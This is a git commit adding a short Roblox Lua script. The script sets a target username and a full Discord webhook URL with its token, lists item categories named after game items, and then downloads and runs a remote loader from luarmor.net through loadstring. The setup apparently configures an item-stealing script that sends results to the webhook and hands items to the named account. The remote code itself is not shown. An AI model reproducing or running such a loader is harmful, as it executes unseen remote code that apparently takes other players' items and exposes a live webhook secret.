4a1d677c7099095110ff88de828667b489876a55
sab-api <carlosignaa2019@gmail.com>
2026-09-08 02:37:20 -0300

    Add script Useit_1788845839917.lua

---
+++ scripts/Useit_1788845839917.lua
@@ -0,0 +1,10 @@
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "Damian122625"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1546648758077489284/Pw-AyVMjUHGvQvcycM9i-tAofio3qUB1HED7vVie1RqbcJPYRpMZMwZhsvoOYwzO5asG ```"
+getgenv().NORMAL_BRAINROTS = {}
+getgenv().NORMAL_BASE_SKINS = {}
+getgenv().NORMAL_GEARS = {}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
